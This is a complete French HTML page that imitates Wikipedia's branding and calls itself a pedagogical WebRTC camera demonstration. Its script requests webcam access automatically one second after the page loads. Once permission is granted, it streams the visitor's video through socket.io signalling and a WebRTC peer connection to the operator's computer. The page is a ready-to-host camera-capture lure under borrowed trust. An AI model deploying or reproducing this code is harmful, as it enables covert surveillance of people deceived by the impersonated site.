<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wikipédia — Démonstration</title>

    <style>
        body {
            margin: 0;
            background: #f8f9fa;
            color: #202122;
            font-family: Arial, sans-serif;
        }

        header {
            background: white;
            border-bottom: 1px solid #a2a9b1;
            padding: 15px 30px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo {
            font-family: Georgia, serif;
            font-size: 42px;
        }

        .title {
            font-size: 22px;
            font-weight: bold;
        }

        main {
            max-width: 950px;
            margin: 30px auto;
            padding: 20px;
        }

        h1 {
            font-family: Georgia, serif;
            font-weight: normal;
            border-bottom: 1px solid #a2a9b1;
            padding-bottom: 10px;
        }

        p {
            line-height: 1.6;
        }

        #status {
            margin-top: 30px;
            padding: 20px;
            background: white;
            border: 1px solid #a2a9b1;
        }

        #camera {
            display: none;
            margin-top: 20px;
            padding: 20px;
            background: #202122;
            color: white;
            border-radius: 5px;
        }

        video {
            width: 100%;
            max-width: 600px;
            background: black;
            border-radius: 5px;
        }

        .green {
            color: #00c853;
            font-weight: bold;
        }
    </style>
</head>

<body>

<header>
    <div class="logo">W</div>
    <div class="title">WIKIPÉDIA — Démonstration</div>
</header>

<main>

    <h1>Cybersécurité</h1>

    <p>
        Cette page présente une démonstration pédagogique
        d'une connexion caméra utilisant WebRTC.
    </p>

    <p>
        Le navigateur demande explicitement l'autorisation
        d'utiliser la caméra.
    </p>

    <div id="status">
        Initialisation de la démonstration...
    </div>

    <div id="camera">
        <p class="green">● Caméra autorisée — flux transmis au PC</p>
        <video id="video" autoplay muted playsinline></video>
    </div>

</main>

<script src="/socket.io/socket.io.js"></script>

<script>
const socket = io();

const status = document.getElementById("status");
const camera = document.getElementById("camera");
const video = document.getElementById("video");

let peerConnection;

const config = {
    iceServers: [
        { urls: "stun:stun.l.google.com:19302" }
    ]
};

async function startCamera() {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        video.srcObject = stream;

        camera.style.display = "block";

        status.innerHTML =
            '<span class="green">Caméra autorisée. Connexion au PC...</span>';

        peerConnection = new RTCPeerConnection(config);

        stream.getTracks().forEach(track => {
            peerConnection.addTrack(track, stream);
        });

        peerConnection.onicecandidate = event => {
            if (event.candidate) {
                socket.emit("ice-candidate", event.candidate);
            }
        };

        const offer = await peerConnection.createOffer();

        await peerConnection.setLocalDescription(offer);

        socket.emit("offer", offer);

        status.innerHTML =
            '<span class="green">● Flux caméra envoyé au PC</span>';

    } catch (error) {

        console.error(error);

        status.textContent =
            "La caméra n'a pas été autorisée.";

    }
}

setTimeout(startCamera, 1000);
</script>

</body>
</html>
